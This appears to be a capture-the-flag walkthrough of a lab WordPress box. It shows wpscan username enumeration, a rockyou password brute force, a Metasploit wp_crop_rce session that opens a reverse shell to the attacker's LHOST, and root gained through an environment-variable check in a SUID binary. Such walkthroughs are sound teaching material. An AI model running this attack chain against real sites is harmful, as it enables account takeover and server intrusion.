```

On port 80 i found a webserver. I looked for the `robots.txt` and found following entries:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

Since the server is running wordpress i started a scan with `wpscan` to enumerate usernames.

```shell
wpscan --url http://blog.thm --enumerate u
```

This gives me a few usernames.

```
kwheel
bjoel
Karen Wheeler
Billy Joel
```

## üí• Exploitation:

I thought the obvious username to brute force was `bjoel`, but it turned out to be `kwheel`.

After a few minutes (hate bruteforce) i get the password for `kwheel` which is `cut******`.

```shell
wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel
```

After a login on `http://blog.thm/wp-login.php` i can see that the used wordpress version is `5.0`.

I used searchsploit to find some authenticated RCE exploits and tried them out. I started metasploit and was able to get a shell trough the `wp_crop_rce` exploit.

```shell
msfconsole

search wordpress 5.0

use exploit/multi/http/wp_crop_rce

set PASSWORD cutiepie1
set USERNAME kwheel
set RHOSTS http://blog.thm
set LHOST 10.10.10.10

run
```

I switched to `bjoels` home directory and i have found the `user.txt` which gives me just a:

```
You won't find what you're looking for here.

TRY HARDER
```

## üîì Priviledge Escalation:

I looked for the usual things for privesc (sudo -l, cronjobs) and after a search for SUID binarys i found `/usr/sbin/checker` what caught my attention. I  runed it and get just a:

```shell
/usr/sbin/checker
Not an Admin
```

This was not helpful so i runed the binary again with `ltrace`, wich gives me this back:

```shell
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

So since the binary is checking for the environment variable `admin` i have just set it trought `export` and after running the `checker binary` again i was root. Then i was able to grab both flags.
